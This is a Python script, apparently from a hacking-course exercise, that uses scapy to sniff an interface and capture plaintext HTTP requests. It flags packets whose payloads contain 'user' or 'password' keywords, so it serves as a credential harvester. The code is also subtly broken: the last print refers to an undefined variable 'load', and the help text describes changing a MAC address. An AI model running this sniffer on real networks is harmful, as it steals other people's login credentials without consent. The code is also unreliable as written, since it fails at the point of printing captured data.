#!/usr/bin/env python

import scapy.all as scapy        #pip install --pre scapy[complete]
from scapy.layers import http    #pip install scapy_http
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i" , "--interface",dest = "interface", help="Interface to change its MAC ")
    options = parser.parse_args()
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    #scapy.sniff(iface="#INTERFACE", store="FALSE BECAUSE IT TELLS KP TO NOT TO STORE PACKETS IN MEMORY, prn="THIS ARGUMENT ALLOWS US TO SPECIFY A CALLBACK FUNCTION")

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)   #Convert byte like object to string
        keywords = ["username", "user", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())   #print("[+] HTTP Request >> " + str(url))
        # .decode() use to convert byte which is machine readable to string which is human readble

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + load + "\n\n")

options = get_arguments()
sniff(options.interface)